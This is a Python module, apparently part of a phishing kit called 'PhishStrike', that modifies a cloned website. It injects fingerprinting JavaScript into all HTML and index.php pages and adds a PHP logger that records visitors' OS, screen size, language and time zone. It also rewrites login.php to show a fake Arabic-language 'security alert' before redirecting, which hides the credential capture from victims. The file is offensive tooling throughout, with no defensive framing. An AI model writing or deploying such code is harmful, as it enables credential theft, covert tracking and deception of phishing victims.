import os
import re

# Custom Post-Login Alert Template
ALERT_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Alert</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f3f2f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            direction: rtl;
        }
        .alert-box {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            max-width: 450px;
            text-align: center;
            border-top: 5px solid #d93025;
        }
        .alert-box h2 {
            color: #d93025;
            margin-top: 0;
        }
        .alert-box p {
            color: #3c4043;
            font-size: 16px;
            line-height: 1.5;
        }
        .spinner {
            border: 4px solid rgba(0,0,0,0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border-left-color: #d93025;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="alert-box">
        <h2>تنبيه أمني هام</h2>
        <p>تم اكتشاف محاولة تسجيل دخول من موقع جديد أو جهاز غير مألوف.</p>
        <p>يرجى الانتظار بينما نقوم بالتحقق من هويتك وتأمين حسابك...</p>
        <div class="spinner"></div>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = '{REDIRECT_URL}';
        }, 4000);
    </script>
</body>
</html>
"""

# Fingerprinting JavaScript
FINGERPRINT_JS = """
<script>
    // PhishStrike Advanced Fingerprinting
    (function() {
        var data = {
            os: navigator.platform,
            browser: navigator.userAgent,
            screen_width: screen.width,
            screen_height: screen.height,
            language: navigator.language,
            time_zone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "log_fingerprint.php", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify(data));
    })();
</script>
"""

# PHP script to receive fingerprint data
FINGERPRINT_PHP = """<?php
$data = json_decode(file_get_contents('php://input'), true);
if($data) {
    $log = "OS: " . $data['os'] . " | Screen: " . $data['screen_width'] . "x" . $data['screen_height'] . " | Lang: " . $data['language'] . " | TZ: " . $data['time_zone'] . "\\n";
    file_put_contents('fingerprint.txt', $log, FILE_APPEND);
}
?>"""


def inject_features(www_dir):
    """
    Injects advanced data collection and custom post-login alerts into the copied site.
    """
    # 1. Create log_fingerprint.php in www_dir
    with open(os.path.join(www_dir, "log_fingerprint.php"), "w", encoding="utf-8") as f:
        f.write(FINGERPRINT_PHP)

    for root, dirs, files in os.walk(www_dir):
        for file in files:
            file_path = os.path.join(root, file)

            # 2. Inject fingerprinting JS into all HTML and index.php files
            if file.endswith(".html") or file == "index.php":
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        content = f.read()

                    if "<head>" in content:
                        content = content.replace("<head>", "<head>\n" + FINGERPRINT_JS)
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(content)
                except Exception:
                    pass  # Ignore files that can't be read/written as utf-8

            # 3. Modify login.php to show custom alert before redirecting
            if file == "login.php":
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        content = f.read()

                    # Look for header('Location: ...');
                    match = re.search(
                        r"header\(\s*['\"]Location:\s*(.*?)['\"]\s*\);",
                        content,
                        re.IGNORECASE,
                    )
                    if match:
                        redirect_url = match.group(1)
                        # Remove the header redirect and exit
                        content = re.sub(
                            r"header\(\s*['\"]Location:\s*.*?['\"]\s*\);",
                            "",
                            content,
                            flags=re.IGNORECASE,
                        )
                        content = re.sub(r"exit\(\);", "", content, flags=re.IGNORECASE)

                        # Append the alert HTML instead
                        alert_html = ALERT_TEMPLATE.replace(
                            "{REDIRECT_URL}", redirect_url
                        )

                        # We need to make sure the PHP tag is closed before appending HTML
                        if "?>" in content:
                            content = content.replace("?>", "?>\n" + alert_html)
                        else:
                            content += "\n?>\n" + alert_html

                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(content)
                except Exception:
                    pass
